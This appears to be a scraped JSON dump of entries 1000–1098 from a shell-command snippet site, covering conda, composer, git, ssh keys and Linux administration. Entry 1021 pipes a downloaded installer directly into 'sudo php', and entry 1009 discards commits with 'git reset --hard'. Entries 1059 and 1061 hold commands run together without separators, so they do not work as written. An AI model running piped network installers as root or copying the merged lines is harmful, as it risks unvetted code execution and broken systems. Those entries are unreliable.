    "reg_date": "2021-10-11T22:02:53.000Z"
  },
  {
    "id": 1000,
    "keyword": null,
    "link": null,
    "title": " command to restart linux",
    "description": "sudo reboot\n",
    "reg_date": "2021-10-11T22:02:54.000Z"
  },
  {
    "id": 1001,
    "keyword": null,
    "link": null,
    "title": " command to run jar file linux",
    "description": "java -jar filex.jar\n",
    "reg_date": "2021-10-11T22:02:54.000Z"
  },
  {
    "id": 1002,
    "keyword": null,
    "link": null,
    "title": " command wait bash",
    "description": "sleep NUMBER[SUFFIX]\t#Just use this command structure to wait/sleep #Example: sleep 5m\t#sleeps 5 minutes sleep 0.1\t\t#sleeps 0.1 seconds or 100 miliseconds #Suffixes s - seconds (default) m - minutes h - hours d - days When no suffix is specified, it defaults to seconds.\n",
    "reg_date": "2021-10-11T22:02:54.000Z"
  },
  {
    "id": 1003,
    "keyword": null,
    "link": null,
    "title": " commands in ubuntu to get hardware information",
    "description": "lshw is a small tool to extract detailed information on the hardware configuration of the machine. It can report exact memory configuration, firmware version, mainboard configuration, CPU version and speed, cache configuration, bus speed, etc. $ sudo lshw | less (or more) $ sudo lshw -html > myhardware.html $ sudo lshw -xml > myhardware.xml  To show PCI info: $ lspci -tv  To see USB info: $ lsusb -tv  To display BIOS information: $ dmidecode -q   To see specific information about disk (disk sda in example) you can use: $ hdparm -i /dev/sda\n",
    "reg_date": "2021-10-11T22:02:54.000Z"
  },
  {
    "id": 1004,
    "keyword": null,
    "link": null,
    "title": " commit no verify",
    "description": "git commit -m \"message\" --no-verify git push --no-verify\n",
    "reg_date": "2021-10-11T22:02:54.000Z"
  },
  {
    "id": 1005,
    "keyword": null,
    "link": null,
    "title": " commit to another branch",
    "description": "git stash git checkout other-branch git stash pop \n",
    "reg_date": "2021-10-11T22:02:55.000Z"
  },
  {
    "id": 1006,
    "keyword": null,
    "link": null,
    "title": " committed to wrong branch",
    "description": "git stash git checkout branch123 git stash apply \n",
    "reg_date": "2021-10-11T22:02:56.000Z"
  },
  {
    "id": 1007,
    "keyword": null,
    "link": null,
    "title": " como actualizar node en ubuntu",
    "description": "~$ sudo npm install -g npm@latest\n",
    "reg_date": "2021-10-11T22:02:56.000Z"
  },
  {
    "id": 1008,
    "keyword": null,
    "link": null,
    "title": " como annadir clave ssh",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n",
    "reg_date": "2021-10-11T22:02:56.000Z"
  },
  {
    "id": 1009,
    "keyword": null,
    "link": null,
    "title": " como deletar o ultimo commit",
    "description": "git reset --hard HEAD~1 \n",
    "reg_date": "2021-10-11T22:02:56.000Z"
  },
  {
    "id": 1010,
    "keyword": null,
    "link": null,
    "title": " como desistalar o code visual  code linux",
    "description": "sudo apt purge code \n",
    "reg_date": "2021-10-11T22:02:57.000Z"
  },
  {
    "id": 1011,
    "keyword": null,
    "link": null,
    "title": " como instalar telegram ubuntu",
    "description": "sudo apt install telegram-desktop\n",
    "reg_date": "2021-10-11T22:02:57.000Z"
  },
  {
    "id": 1012,
    "keyword": null,
    "link": null,
    "title": " como saber la distribucion de linux por consola",
    "description": "lsb_release -d\n",
    "reg_date": "2021-10-11T22:02:57.000Z"
  },
  {
    "id": 1013,
    "keyword": null,
    "link": null,
    "title": " compile h5py",
    "description": "git clone https://github.com/h5py/h5py.git cd /h5py sudo python3 setup.py install\n",
    "reg_date": "2021-10-11T22:02:57.000Z"
  },
  {
    "id": 1014,
    "keyword": null,
    "link": null,
    "title": " completely remove app from linux",
    "description": "dpkg --list #get softwere list sudo apt-get --purge remove APP_NAME sudo apt-get autoremove sudo apt-get clean \n",
    "reg_date": "2021-10-11T22:02:57.000Z"
  },
  {
    "id": 1015,
    "keyword": null,
    "link": null,
    "title": " completely uninstall apache from ubuntu",
    "description": "#stop the apache2 service  $ sudo systemctl stop apache2   #remove apache2 packages $ sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common  # cleanup $ sudo apt-get autoremove  # check if the apache has been removed: #1- following command line should return a blank line $ which apache2    # 2- following command line should return apache2: Failed to start apache2.service: Unit apache2.service not found. $ sudo systemctl start apache2   \nsudo apt-get remove --purge apache2 apache2-data apache2-utils\nsudo apt autoremove sudo apt remove apache2 sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common\n#How to completely remove Apache2 on Ubuntu 20.04 and similar distributions.  #stop the apache2 service  $ sudo systemctl stop apache2   #remove apache2 packages $ sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common  # cleanup $ sudo apt-get autoremove  # check if the apache has been removed: #1- following command line should return a blank line $ which apache2     # 2- following command line should return apache2: Failed to start apache2.service: Unit apache2.service not found. $ sudo systemctl start apache2    @Oceangreen Technology - We Work For Excellence\n",
    "reg_date": "2021-10-11T22:02:58.000Z"
  },
  {
    "id": 1016,
    "keyword": null,
    "link": null,
    "title": " composer 2 install in windows 10",
    "description": "composer self-update --2\nwhy is it so hard to install composer every time it's a struggle\n",
    "reg_date": "2021-10-11T22:02:58.000Z"
  },
  {
    "id": 1017,
    "keyword": null,
    "link": null,
    "title": " composer drupal install",
    "description": "composer create-project drupal/recommended-project my_site_name_dir\n",
    "reg_date": "2021-10-11T22:02:58.000Z"
  },
  {
    "id": 1018,
    "keyword": null,
    "link": null,
    "title": " composer get version of package",
    "description": "composer show package/name\ncomposer show vendor/package |grep 'versions :'  #Simple composer show laravel/framework |grep 'versions :'\ncomposer show -i \n",
    "reg_date": "2021-10-11T22:02:58.000Z"
  },
  {
    "id": 1019,
    "keyword": null,
    "link": null,
    "title": " composer install drush",
    "description": "composer require --dev drush/drush\ncomposer create-project drupal/recommended-project my_site_name_dir\n",
    "reg_date": "2021-10-11T22:02:59.000Z"
  },
  {
    "id": 1020,
    "keyword": null,
    "link": null,
    "title": " composer install production",
    "description": "composer install --no-dev --optimize-autoloader\n",
    "reg_date": "2021-10-11T22:02:59.000Z"
  },
  {
    "id": 1021,
    "keyword": null,
    "link": null,
    "title": " composer install ubuntu 20.04",
    "description": "php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\" php -r \"if (hash_file('sha384', 'composer-setup.php') === '756890a4488ce9024fc62c56153228907f1545c228516cbf63f885e036d37e9a59d27d63f46af1d4d07ee0f76181c7d3') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\" php composer-setup.php php -r \"unlink('composer-setup.php');\"  #move composer.phar, so you can call composer command sudo mv composer.phar /usr/local/bin/composer\nphp -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"\n# download composer.phar to /usr/bin and symlink composer to composer.phar pushd /usr/bin >/dev/null && sudo wget -O composer.phar https://getcomposer.org/composer-stable.phar && sudo chmod 755 composer.phar && sudo ln -fs composer.phar composer && popd >/dev/null\ncd ~ curl -sS https://getcomposer.org/installer | sudo php sudo mv composer.phar /usr/local/bin/composer \nFirst, update the package manager cache by running:  sudo apt update   Next, run the following command to install the required packages:  sudo apt install php-cli unzip  Make sure you&rsquo;re in your home directory, then retrieve the installer using curl:  cd ~ curl -sS https://getcomposer.org/installer -o composer-setup.php  Next, we&rsquo;ll verify that the downloaded installer matches the SHA-384 hash for the latest installer found on the Composer Public Keys / Signatures page. To facilitate the verification step, you can use the following command to programmatically obtain the latest hash from the Composer page and store it in a shell variable:  HASH=`curl -sS https://composer.github.io/installer.sig`   If you want to verify the obtained value, you can run:  echo $HASH  Now execute the following PHP code, as provided in the Composer download page, to verify that the installation script is safe to run:  php -r \"if (hash_file('SHA384', 'composer-setup.php') === '$HASH') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\"   You&rsquo;ll see the following output:  Output Installer verified  If the output says Installer corrupt, you&rsquo;ll need to download the installation  script again and double check that you&rsquo;re using the correct hash. Then, repeat the verification process. When you have a verified installer,you can continue.  To install composer globally, use the following command which will download and install Composer as a system-wide command named composer, under /usr/local/bin:  sudo php composer-setup.php --install-dir=/usr/local/bin --filename=composer  You&rsquo;ll see output similar to this:  Output All settings correct for using Composer Downloading...  Composer (version 1.10.5) successfully installed to: /usr/local/bin/composer Use it: php /usr/local/bin/composer To test your installation, run:  $composer \n",
    "reg_date": "2021-10-11T22:02:59.000Z"
  },
  {
    "id": 1022,
    "keyword": null,
    "link": null,
    "title": " composer installed versions",
    "description": "composer show -i \n",
    "reg_date": "2021-10-11T22:02:59.000Z"
  },
  {
    "id": 1023,
    "keyword": null,
    "link": null,
    "title": " composer require laravel/ui app.css empty",
    "description": "Try remove folder node_modules,  then run this again:  npm install   Make sure installation done without error  and then compile again using:  npm run prod\n",
    "reg_date": "2021-10-11T22:02:59.000Z"
  },
  {
    "id": 1024,
    "keyword": null,
    "link": null,
    "title": " composer requires ext-dom *",
    "description": "sudo apt install php-xml\n",
    "reg_date": "2021-10-11T22:02:59.000Z"
  },
  {
    "id": 1025,
    "keyword": null,
    "link": null,
    "title": " composer tree",
    "description": "composer show --tree\n",
    "reg_date": "2021-10-11T22:03:00.000Z"
  },
  {
    "id": 1026,
    "keyword": null,
    "link": null,
    "title": " composer uninstall",
    "description": "composer remove vendor/package\ncomposer remove vendor/package \nSyntax: composer remove <package>  Example: composer remove laravel/tinker\nDelete the file composer.phar. Delete the Cache Folder: Linux: /home/<user>/.composer Windows: C:\\Users\\<username>\\AppData\\Roaming\\Composer \n",
    "reg_date": "2021-10-11T22:03:00.000Z"
  },
  {
    "id": 1027,
    "keyword": null,
    "link": null,
    "title": " composer update composer",
    "description": "composer self-update \n",
    "reg_date": "2021-10-11T22:03:00.000Z"
  },
  {
    "id": 1028,
    "keyword": null,
    "link": null,
    "title": " compress file in terminal",
    "description": "tar -czvf name-of-archive.tar.gz /path/to/directory-or-file\n",
    "reg_date": "2021-10-11T22:03:00.000Z"
  },
  {
    "id": 1029,
    "keyword": null,
    "link": null,
    "title": " compress folder in tar.gz unix",
    "description": "#Compress a folder in tar.gz format tar -zcvf final_archive.tar.gz folder_to_compress/  #Multicore compression using pigz (can be installed with: conda install -c anaconda pigz) tar cf - ./folder_to_compress/ | pigz -9 -p NPROC > final_archive.tar.gz\n",
    "reg_date": "2021-10-11T22:03:00.000Z"
  },
  {
    "id": 1030,
    "keyword": null,
    "link": null,
    "title": " compress video ffmpeg",
    "description": " ffmpeg -i input.mp4 -vcodec libx265 -crf 28 output.mp4\n ffmpeg -i input.mp4 -vcodec libx265 -crf 28 output.mp4 \n",
    "reg_date": "2021-10-11T22:03:01.000Z"
  },
  {
    "id": 1031,
    "keyword": null,
    "link": null,
    "title": " computer running linux",
    "description": "/* Quite the odd seach... */ /* But hey! Congrats on being a part of the linux community */\n",
    "reg_date": "2021-10-11T22:03:01.000Z"
  },
  {
    "id": 1032,
    "keyword": null,
    "link": null,
    "title": " concatenate strings batch",
    "description": "SET a = Hello  SET b = World  SET c=%a% and %b%  echo %c%  -- output -- Hello and World\n",
    "reg_date": "2021-10-11T22:03:01.000Z"
  },
  {
    "id": 1033,
    "keyword": null,
    "link": null,
    "title": " conda activate not working in powershell",
    "description": "conda init powershell\n",
    "reg_date": "2021-10-11T22:03:01.000Z"
  },
  {
    "id": 1034,
    "keyword": null,
    "link": null,
    "title": " conda add kernel",
    "description": "source activate myenv python -m ipykernel install --user --name myenv --display-name \"Python (myenv)\" \nconda activate myenv conda install ipykernel python -m ipykernel install --user --name myenv  --display-name \"myenv\"\n",
    "reg_date": "2021-10-11T22:03:02.000Z"
  },
  {
    "id": 1035,
    "keyword": null,
    "link": null,
    "title": " conda auto activate base false",
    "description": "conda config --set auto_activate_base false\nconda config --set auto_activate_base true\n",
    "reg_date": "2021-10-11T22:03:02.000Z"
  },
  {
    "id": 1036,
    "keyword": null,
    "link": null,
    "title": " conda auto start flase",
    "description": "conda config --set auto_activate_base false\n",
    "reg_date": "2021-10-11T22:03:02.000Z"
  },
  {
    "id": 1037,
    "keyword": null,
    "link": null,
    "title": " conda check cuda version",
    "description": "nvidia-smi nvcc --version\nnvcc --version\nconda list cudatoolkit\n",
    "reg_date": "2021-10-11T22:03:02.000Z"
  },
  {
    "id": 1038,
    "keyword": null,
    "link": null,
    "title": " conda correct install opencv",
    "description": "conda install -c menpo opencv\n",
    "reg_date": "2021-10-11T22:03:03.000Z"
  },
  {
    "id": 1039,
    "keyword": null,
    "link": null,
    "title": " conda create env from yml",
    "description": "conda env create -f environment.yml\n# Basic syntax: conda create --name environment_name --file environment.yml\n# save conda env to .yml  conda env export > environment.yml\nconda env export > environment_droplet.yml\n# Basic syntax: conda activate environment_to_export # Activate environment, can be base conda env export > environment.yml # Export the environment to .yml\nconda env list \n",
    "reg_date": "2021-10-11T22:03:03.000Z"
  },
  {
    "id": 1040,
    "keyword": null,
    "link": null,
    "title": " conda create environment from file",
    "description": "conda create -n myenv python=3.6\nconda create -n myenv python=x.x\nconda env create -f environment.yml\n# save conda env to .yml  conda env export > environment.yml\nconda env list \nconda create -n  \tNAME \t\tpython=3.8\n",
    "reg_date": "2021-10-11T22:03:03.000Z"
  },
  {
    "id": 1041,
    "keyword": null,
    "link": null,
    "title": " conda create environment from yml",
    "description": "conda env create --file environment.yml -n env_name\nconda create -n myenv python=3.6 \nconda env create -f environment.yml\n# Basic syntax: conda create --name environment_name --file environment.yml\n# save conda env to .yml  conda env export > environment.yml\nconda env export > environment_droplet.yml\n",
    "reg_date": "2021-10-11T22:03:04.000Z"
  },
  {
    "id": 1042,
    "keyword": null,
    "link": null,
    "title": " conda create environment without packages",
    "description": "conda create --name myenv python=3.8 --no-default-packages\nconda create --name myenv \nconda env list \n",
    "reg_date": "2021-10-11T22:03:04.000Z"
  },
  {
    "id": 1043,
    "keyword": null,
    "link": null,
    "title": " conda disable auto activate",
    "description": "conda config --set auto_activate_base false\n",
    "reg_date": "2021-10-11T22:03:04.000Z"
  },
  {
    "id": 1044,
    "keyword": null,
    "link": null,
    "title": " conda do not activate base",
    "description": "conda config --set auto_activate_base false\n",
    "reg_date": "2021-10-11T22:03:04.000Z"
  },
  {
    "id": 1045,
    "keyword": null,
    "link": null,
    "title": " conda install environment without base packages",
    "description": "conda create --name myenv python=3.8 --no-default-packages\n",
    "reg_date": "2021-10-11T22:03:04.000Z"
  },
  {
    "id": 1046,
    "keyword": null,
    "link": null,
    "title": " conda install from environment.yml",
    "description": "conda env create -f environment.yml\n",
    "reg_date": "2021-10-11T22:03:04.000Z"
  },
  {
    "id": 1047,
    "keyword": null,
    "link": null,
    "title": " conda install gensim",
    "description": "conda install -c conda-forge gensim\n",
    "reg_date": "2021-10-11T22:03:04.000Z"
  },
  {
    "id": 1048,
    "keyword": null,
    "link": null,
    "title": " conda install git",
    "description": "conda install -c anaconda git\nconda install -c conda-forge theano\n",
    "reg_date": "2021-10-11T22:03:05.000Z"
  },
  {
    "id": 1049,
    "keyword": null,
    "link": null,
    "title": " conda install keras",
    "description": "conda install -c conda-forge keras\nconda install -c conda-forge tensorflow\n",
    "reg_date": "2021-10-11T22:03:05.000Z"
  },
  {
    "id": 1050,
    "keyword": null,
    "link": null,
    "title": " conda install keras gpu",
    "description": "conda install -c anaconda keras-gpu\n",
    "reg_date": "2021-10-11T22:03:05.000Z"
  },
  {
    "id": 1051,
    "keyword": null,
    "link": null,
    "title": " conda install matplotlib",
    "description": "conda install -c conda-forge matplotlib \npip install matplotlib\nconda install matplotlib\n",
    "reg_date": "2021-10-11T22:03:05.000Z"
  },
  {
    "id": 1052,
    "keyword": null,
    "link": null,
    "title": " conda install mmcv",
    "description": "pip install mmcv \n",
    "reg_date": "2021-10-11T22:03:05.000Z"
  },
  {
    "id": 1053,
    "keyword": null,
    "link": null,
    "title": " conda install networkx",
    "description": "conda install -c anaconda networkx\n",
    "reg_date": "2021-10-11T22:03:05.000Z"
  },
  {
    "id": 1054,
    "keyword": null,
    "link": null,
    "title": " conda install nodejs",
    "description": "conda install -c conda-forge nodejs conda install -c conda-forge/label/gcc7 nodejs conda install -c conda-forge/label/cf201901 nodejs conda install -c conda-forge/label/cf202003 nodejs\n",
    "reg_date": "2021-10-11T22:03:06.000Z"
  },
  {
    "id": 1055,
    "keyword": null,
    "link": null,
    "title": " conda install numpy",
    "description": "conda install numpy\nconda install -c anaconda scipy\npy -m pip install numpy\n#To install a package in currently active enviroment conda install package-name\nimport numpy as np np.version \n",
    "reg_date": "2021-10-11T22:03:06.000Z"
  },
  {
    "id": 1056,
    "keyword": null,
    "link": null,
    "title": " conda install openjdk=11",
    "description": "conda install -c conda-forge openjdk=11\n",
    "reg_date": "2021-10-11T22:03:06.000Z"
  },
  {
    "id": 1057,
    "keyword": null,
    "link": null,
    "title": " conda install pytorch",
    "description": "conda install -c anaconda pandas \nconda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\nconda install pytorch torchvision cudatoolkit=10.1 -c pytorch\nconda install pytorch torchvision cudatoolkit=10.0 -c pytorch\n(pytorch)$ conda install -y pytorch torchvision -c pytorch \n(pytorch)$ python -m ipykernel install --user --name pytorch --display-name \"PyTorch\" \n",
    "reg_date": "2021-10-11T22:03:06.000Z"
  },
  {
    "id": 1058,
    "keyword": null,
    "link": null,
    "title": " conda install requirements.txt example",
    "description": "conda install --file requirements.txt\n",
    "reg_date": "2021-10-11T22:03:07.000Z"
  },
  {
    "id": 1059,
    "keyword": null,
    "link": null,
    "title": " conda install scikit-learn",
    "description": "pip install scikit-learn\nconda install -c conda-forge scikit-learn\nconda install -c anaconda scikit-learn\nconda install -c anaconda scipy\nconda install scikit-learn=0.20\npython3 -m venv sklearn-venvpython -m venv sklearn-venvpython -m venv sklearn-venvsource sklearn-venv/bin/activatesource sklearn-venv/bin/activatesklearn-venv\\Scripts\\activatepip install -U scikit-learnpip install -U scikit-learnpip install -U scikit-learnpip3 install -U scikit-learnconda create -n sklearn-envconda activate sklearn-envconda install scikit-learn \n",
    "reg_date": "2021-10-11T22:03:07.000Z"
  },
  {
    "id": 1060,
    "keyword": null,
    "link": null,
    "title": " conda install scipy",
    "description": "conda install -c conda-forge scikit-learn\nconda install -c anaconda scikit-learn\nconda install -c anaconda scipy\n",
    "reg_date": "2021-10-11T22:03:07.000Z"
  },
  {
    "id": 1061,
    "keyword": null,
    "link": null,
    "title": " conda install sklearn",
    "description": "pip install scikit-learn\nconda install scikit-learn\nconda install -c conda-forge scikit-learn\nconda install -c anaconda scikit-learn\nconda install scikit-learn=0.20\npython3 -m venv sklearn-venvpython -m venv sklearn-venvpython -m venv sklearn-venvsource sklearn-venv/bin/activatesource sklearn-venv/bin/activatesklearn-venv\\Scripts\\activatepip install -U scikit-learnpip install -U scikit-learnpip install -U scikit-learnpip3 install -U scikit-learnconda create -n sklearn-envconda activate sklearn-envconda install scikit-learn \n",
    "reg_date": "2021-10-11T22:03:07.000Z"
  },
  {
    "id": 1062,
    "keyword": null,
    "link": null,
    "title": " conda install tensorboard",
    "description": "conda install -c conda-forge keras\nconda install -c conda-forge tensorboard\nconda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\n",
    "reg_date": "2021-10-11T22:03:07.000Z"
  },
  {
    "id": 1063,
    "keyword": null,
    "link": null,
    "title": " conda install tensorflow windows",
    "description": "conda install -c conda-forge tensorflow\nconda install -c conda-forge tensorflow=1.14\n",
    "reg_date": "2021-10-11T22:03:08.000Z"
  },
  {
    "id": 1064,
    "keyword": null,
    "link": null,
    "title": " conda install tqdm",
    "description": "conda install -c conda-forge tqdm\nsudo pip3 install tqdm\n",
    "reg_date": "2021-10-11T22:03:08.000Z"
  },
  {
    "id": 1065,
    "keyword": null,
    "link": null,
    "title": " conda install xlrd",
    "description": "conda install -c anaconda xlrd\n",
    "reg_date": "2021-10-11T22:03:08.000Z"
  },
  {
    "id": 1066,
    "keyword": null,
    "link": null,
    "title": " conda set python version",
    "description": " conda search python  conda install python=3.6.2\n conda install python=3.5.0   # or maybe    conda install python=2.7.8   # or whatever you want.... \nconda update python \nconda activate my_env conda install python=3.6\n",
    "reg_date": "2021-10-11T22:03:09.000Z"
  },
  {
    "id": 1067,
    "keyword": null,
    "link": null,
    "title": " conda statsmodels python",
    "description": "conda install -c anaconda statsmodels\n",
    "reg_date": "2021-10-11T22:03:09.000Z"
  },
  {
    "id": 1068,
    "keyword": null,
    "link": null,
    "title": " conda update existing environment from yml",
    "description": "# Basic syntax: conda activate environment_to_update # Activate environment, can be base conda env update --file environment.yml # Update env from .yml file\n$ conda activate earth-analytics-python $ conda env update -f environment.yml \n",
    "reg_date": "2021-10-11T22:03:09.000Z"
  },
  {
    "id": 1069,
    "keyword": null,
    "link": null,
    "title": " conda update package",
    "description": "# Basic syntax: conda update packagename # To update specific package in the current env conda update --all # To update all packages in the current environment conda update -n myenv --all # To update all packages in myenv environment\nconda update --all \n",
    "reg_date": "2021-10-11T22:03:09.000Z"
  },
  {
    "id": 1070,
    "keyword": null,
    "link": null,
    "title": " configure basepackags ansible",
    "description": "- name: Install base packages  apt: name={{ item }} state=installed  with_items:    - locales    - build-essential    - acl    - ntp    - htop    - git    - supervisor    - python-pip    - python3-pip    - nginx  tags:    - packages- name: Upgrade pip  pip: name=pip state=latest  tags:    - packages- name: Create user  user:    name: \"deploy_user\"    comment: \"Used to deploy Django\"    state: present- name: Create .ssh folder  file:    path: \"/home/deploy_user/.ssh/\"    state: directory    mode: 0755\n",
    "reg_date": "2021-10-11T22:03:09.000Z"
  },
  {
    "id": 1071,
    "keyword": null,
    "link": null,
    "title": " configure epel repo rhel 8",
    "description": "$ sudo dnf install https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm \n$ sudo dnf update \n",
    "reg_date": "2021-10-11T22:03:09.000Z"
  },
  {
    "id": 1072,
    "keyword": null,
    "link": null,
    "title": " configure error c compiler cannot create executables ubuntu",
    "description": "sudo apt-get install build-essential \n",
    "reg_date": "2021-10-11T22:03:09.000Z"
  },
  {
    "id": 1073,
    "keyword": null,
    "link": null,
    "title": " configure git",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\n$ git config --global core.editor vim\ngit config --global user.name \"My Name\"\ngit config --global user.name \"John Doe\" git config --global user.email johndoe@example.com\n//add username git config --global user.name \"your_username\"  //add email git config --global user.email \"your_email_address@example.com\"  //check configuration git config --global --list\n$ git config --list --show-origin\n",
    "reg_date": "2021-10-11T22:03:09.000Z"
  },
  {
    "id": 1074,
    "keyword": null,
    "link": null,
    "title": " configure your git username/email",
    "description": "git config --global user.name \"FIRST_NAME LAST_NAME\" git config --global user.email \"YourEmail@example.com\"\n$ git config --global user.email \"email@example.com\"\ngit config --global --edit\ncat .gitconfig\n",
    "reg_date": "2021-10-11T22:03:10.000Z"
  },
  {
    "id": 1075,
    "keyword": null,
    "link": null,
    "title": " connect emulator to localhost",
    "description": "You can use 10.0.2.2 to access your actual machine, it is an alias set up to help in development.\n",
    "reg_date": "2021-10-11T22:03:10.000Z"
  },
  {
    "id": 1076,
    "keyword": null,
    "link": null,
    "title": " connect local repository to remote git",
    "description": "git remote add origin <remote repository URL> # Sets the new remote git remote -v # Verifies the new remote URL git push origin master\ngit remote add origin <remote_repo_url> git push --all origin  If you want to set all of your branches to  automatically use this remote repo when you use git pull, add --set-upstream to the push:  git push --all --set-upstream origin\ngit init git commit -m \"[message]\" git remote add origin \"github repository link\" git push -u origin master\n",
    "reg_date": "2021-10-11T22:03:10.000Z"
  },
  {
    "id": 1077,
    "keyword": null,
    "link": null,
    "title": " connect to pod kubectl",
    "description": "kubectl exec --stdin --tty shell-demo -- /bin/bash \n",
    "reg_date": "2021-10-11T22:03:10.000Z"
  },
  {
    "id": 1078,
    "keyword": null,
    "link": null,
    "title": " connect wifi using command line",
    "description": "nmcli dev wifi connect <essid> password <key>\n",
    "reg_date": "2021-10-11T22:03:10.000Z"
  },
  {
    "id": 1079,
    "keyword": null,
    "link": null,
    "title": " connection failed blueman.bluez.errors.dbusfailederror protocol not available",
    "description": "$ sudo apt install pulseaudio-module-bluetooth $ pulseaudio -k $ pulseaudio --start\n",
    "reg_date": "2021-10-11T22:03:10.000Z"
  },
  {
    "id": 1080,
    "keyword": null,
    "link": null,
    "title": " convert all files and folders in current directory into zip in linux",
    "description": "zip -r myfiles.zip mydir\n",
    "reg_date": "2021-10-11T22:03:10.000Z"
  },
  {
    "id": 1081,
    "keyword": null,
    "link": null,
    "title": " convert all files to lowercase using shell script",
    "description": "#!/bin/sh  for x in `ls`   do   if [ ! -f $x ]; then     continue     fi   lc=`echo $x  | tr '[A-Z]' '[a-z]'`   if [ $lc != $x ]; then     mv -i $x $lc   fi   done\n",
    "reg_date": "2021-10-11T22:03:11.000Z"
  },
  {
    "id": 1082,
    "keyword": null,
    "link": null,
    "title": " convert back to sh from zsh",
    "description": "chsh -s /bin/bash exec bash --login  \n",
    "reg_date": "2021-10-11T22:03:11.000Z"
  },
  {
    "id": 1083,
    "keyword": null,
    "link": null,
    "title": " convert crt to pem",
    "description": "openssl x509 -inform DER -in yourdownloaded.crt -out outcert.pem -text \nopenssl x509 -outform der -in your-cert.pem -out your-cert.crt \n",
    "reg_date": "2021-10-11T22:03:11.000Z"
  },
  {
    "id": 1084,
    "keyword": null,
    "link": null,
    "title": " convert dash to underscore windows",
    "description": "Setlocal enabledelayedexpansion  Set \"Pattern=-\" Set \"Replace=_\"  For %%a in (*) Do ( Set \"File=%%~a\" Ren \"%%a\" \"!File:%Pattern%=%Replace%!\" ) \n",
    "reg_date": "2021-10-11T22:03:11.000Z"
  },
  {
    "id": 1085,
    "keyword": null,
    "link": null,
    "title": " convert increase size linux command line",
    "description": "convert example.png -resize 200x100 example.png\n",
    "reg_date": "2021-10-11T22:03:11.000Z"
  },
  {
    "id": 1086,
    "keyword": null,
    "link": null,
    "title": " convert jpg to pdf imagemagick",
    "description": "find /path/to/files -iname '*.jpg' -exec mogrify -format pdf {} +\n",
    "reg_date": "2021-10-11T22:03:11.000Z"
  },
  {
    "id": 1087,
    "keyword": null,
    "link": null,
    "title": " convert pem to private key openssl",
    "description": "openssl rsa -outform der -in private.pem -out private.key \n",
    "reg_date": "2021-10-11T22:03:12.000Z"
  },
  {
    "id": 1088,
    "keyword": null,
    "link": null,
    "title": " convertingwav to mp3 linux ffmpeg",
    "description": "ffmpeg -i input.wav -vn -ar 44100 -ac 2 -b:a 192k output.mp3\nffmpeg -i filename.mp3 newfilename.wav newfilename.ogg newfilename.mp4\n",
    "reg_date": "2021-10-11T22:03:12.000Z"
  },
  {
    "id": 1089,
    "keyword": null,
    "link": null,
    "title": " copy file from docker container to host",
    "description": "docker cp <containerId>:/file/path/within/container /host/path/target \ndocker cp <containerId>:/file/path/within/container /host/path/target\ndocker cp src/. mycontainer:/target docker cp mycontainer:/src/. target \ndocker cp foo.txt mycontainer:/foo.txt \ndocker cp foo.txt mycontainer:/foo.txt\n",
    "reg_date": "2021-10-11T22:03:12.000Z"
  },
  {
    "id": 1090,
    "keyword": null,
    "link": null,
    "title": " copy folder from local to ubuntu server",
    "description": "rsync -avz -e 'ssh' /path/to/local/dir user@remotehost:/path/to/remote/dir \n",
    "reg_date": "2021-10-11T22:03:13.000Z"
  },
  {
    "id": 1091,
    "keyword": null,
    "link": null,
    "title": " copy folder ubuntu",
    "description": "$ cp -r /source_directory /destination_directory\n$ cp -R <source_folder> <destination_folder>\n$ cp -rv /source_directory /destination_directory  # r = copy directories recursively # v = explain what is being done\ncp -R source_dir destination_dir\n$ cp -R <source_folder>/* <destination_folder>\ncp -r /path/to/directory /path/to/location/new-name \n",
    "reg_date": "2021-10-11T22:03:13.000Z"
  },
  {
    "id": 1092,
    "keyword": null,
    "link": null,
    "title": " copy folders linux",
    "description": "cp -R source_dir destination_dir #example cp -R /etc /etc_backup\ncp -R dir1 dir2\n#first - open the directory where the file is located. #cp filename /home/YourUserName/Desktop/ -r #for example cp Books /home/kali/Desktop/ -r\ncp -r yourF ./desdination\n",
    "reg_date": "2021-10-11T22:03:13.000Z"
  },
  {
    "id": 1093,
    "keyword": null,
    "link": null,
    "title": " copy from terminal to clipboard",
    "description": "$ pbcopy < ~/.ssh/id_ed25519.pub # Copies the contents of the id_ed25519.pub file to your clipboard\n",
    "reg_date": "2021-10-11T22:03:13.000Z"
  },
  {
    "id": 1094,
    "keyword": null,
    "link": null,
    "title": " copy my ssh key",
    "description": "clip < ~/.ssh/id_rsa.pub\nssh-copy-id -i ~/.ssh/mykey user@host\n",
    "reg_date": "2021-10-11T22:03:14.000Z"
  },
  {
    "id": 1095,
    "keyword": null,
    "link": null,
    "title": " copy ssh key mac",
    "description": "cat ~/.ssh/id_rsa.pub | pbcopy\nclip < ~/.ssh/id_rsa.pub\nssh-copy-id -i ~/.ssh/mykey user@host\ncat ~/.ssh/id_rsa.pub | ssh <user>@<hostname> 'cat >> .ssh/authorized_keys && echo \"Public key successfully copied\"'\n",
    "reg_date": "2021-10-11T22:03:14.000Z"
  },
  {
    "id": 1096,
    "keyword": null,
    "link": null,
    "title": " copy ssh key to remote server",
    "description": "ssh-copy-id -i ~/.ssh/mykey.pub user@host\nscp -r /path/to/local/dir user@remotehost:/path/to/remote/dir\n",
    "reg_date": "2021-10-11T22:03:14.000Z"
  },
  {
    "id": 1097,
    "keyword": null,
    "link": null,
    "title": " copy ssh keys to remote server windows 10 openSSH",
    "description": "type $env:USERPROFILE\\.ssh\\id_rsa.pub | ssh {IP-ADDRESS-OR-FQDN} \"cat >> .ssh/authorized_keys\" \nssh-copy-id -i ~/.ssh/mykey.pub user@host\n",
    "reg_date": "2021-10-11T22:03:15.000Z"
  },
  {
    "id": 1098,
    "keyword": null,
    "link": null,
    "title": " copy ssh remote server",
    "description": "ssh-copy-id -i ~/.ssh/mykey.pub user@host\nscp -r /path/to/local/dir user@remotehost:/path/to/remote/dir\n",
